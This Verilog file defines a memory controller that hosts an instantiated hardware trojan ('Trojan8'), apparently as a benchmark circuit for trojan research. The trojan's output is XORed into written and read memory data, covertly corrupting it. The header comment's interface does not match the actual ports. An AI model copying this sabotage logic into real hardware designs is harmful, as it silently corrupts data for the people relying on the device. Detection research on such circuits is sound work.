// Memory Host Circuit for Trojan8
// Interface: a[7:0], b[7:0], c[7:0], d[7:0], e[7:0], sel[2:0] -> y[15:0]
module trojan8_memory_host #(
    parameter [95:0] MEM_PATTERN = 96'hDEADBEEF0123456789ABCDEF  // Memory access pattern
)(
    input wire clk,
    input wire rst,
    input wire [31:0] addr,
    input wire [31:0] wdata,
    input wire [3:0] wstrb,
    input wire mem_read,
    input wire mem_write,
    output reg [31:0] rdata,
    output reg mem_ready
);

    // Sizing parameters (converted from parameter to localparam)
    localparam MEM_DEPTH = 1024;           // Memory depth in words
    localparam BANK_COUNT = 4;             // Number of memory banks

    // Trojan interface
    wire [7:0] trojan_a;
    wire [7:0] trojan_b;
    wire [7:0] trojan_c;
    wire [7:0] trojan_d;
    wire [7:0] trojan_e;
    wire [2:0] trojan_sel;
    wire [15:0] trojan_y;
    
    // Memory components  
    reg [31:0] memory_banks [0:1023];  // Fixed size array
    reg [31:0] bank_offset;  // Bank offset based on BANK_COUNT
    reg [95:0] mem_gen;
    reg [2:0] mem_state;
    reg [10:0] mem_addr_reg;  // Make it 11-bit to match MEM_DEPTH comparison
    reg [31:0] mem_data_reg;
    reg [1:0] bank_sel;
    reg [7:0] access_counter;
    
    integer j;
    
    // Memory controller
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            mem_gen <= MEM_PATTERN;
            mem_state <= 3'h0;
            mem_addr_reg <= 11'h0;
            mem_data_reg <= 32'h0;
            bank_sel <= 2'h0;
            bank_offset <= BANK_COUNT << 8;  // Use BANK_COUNT parameter
            access_counter <= 8'h0;
            rdata <= 32'h0;
            mem_ready <= 1'b0;
            
            // Initialize memory banks with pattern
            for (j = 0; j < 1024; j = j + 1) begin
                memory_banks[j] = MEM_PATTERN[31:0] ^ j;  // Blocking assignment is correct for reset initialization
            end
        end else begin
            mem_gen <= {mem_gen[94:0], mem_gen[95]};
            access_counter <= access_counter + 1;
            
            case (mem_state)
                3'h0: begin // IDLE
                    mem_ready <= 1'b0;
                    if (mem_read || mem_write) begin
                        mem_addr_reg <= {1'b0, addr[9:0]};  // Extend to 11-bit
                        mem_data_reg <= wdata;
                        bank_sel <= addr[11:10];  // Use bank_sel for memory banking
                        bank_offset <= (bank_sel * BANK_COUNT) << 6;  // Calculate bank offset
                        mem_state <= 3'h1;
                    end
                end
                3'h1: begin // ADDRESS
                    if (mem_addr_reg < MEM_DEPTH) begin
                        mem_state <= 3'h2;
                    end else begin
                        mem_state <= 3'h0;
                    end
                end
                3'h2: begin // ACCESS
                    if (mem_write) begin
                        if (wstrb[0]) memory_banks[mem_addr_reg[9:0]][7:0] <= (mem_data_reg[7:0] ^ trojan_y[7:0]);
                        if (wstrb[1]) memory_banks[mem_addr_reg[9:0]][15:8] <= (mem_data_reg[15:8] ^ trojan_y[15:8]);
                        if (wstrb[2]) memory_banks[mem_addr_reg[9:0]][23:16] <= (mem_data_reg[23:16] ^ trojan_y[7:0]);
                        if (wstrb[3]) memory_banks[mem_addr_reg[9:0]][31:24] <= (mem_data_reg[31:24] ^ trojan_y[15:8]);
                    end else begin
                        rdata <= memory_banks[mem_addr_reg[9:0]] ^ {16'h0, trojan_y} ^ bank_offset;
                    end
                    mem_state <= 3'h3;
                end
                3'h3: begin // COMPLETE
                    mem_ready <= 1'b1;
                    mem_state <= 3'h0;
                end
                default: mem_state <= 3'h0;
            endcase
        end
    end
    
    // Connect trojan inputs
    assign trojan_a = mem_gen[7:0];
    assign trojan_b = mem_addr_reg[7:0];
    assign trojan_c = mem_data_reg[7:0];
    assign trojan_d = wdata[7:0];
    assign trojan_e = access_counter;
    assign trojan_sel = mem_state;
    
    // Instantiate Trojan8
    Trojan8 #(
        .MASK_00FF(16'h00AA),
        .MASK_0F(8'h0C),
        .MASK_F0F0(16'hA5A5)
    ) trojan_inst (
        .a(trojan_a),
        .b(trojan_b),
        .c(trojan_c),
        .d(trojan_d),
        .e(trojan_e),
        .sel(trojan_sel),
        .y(trojan_y)
    );

endmodule
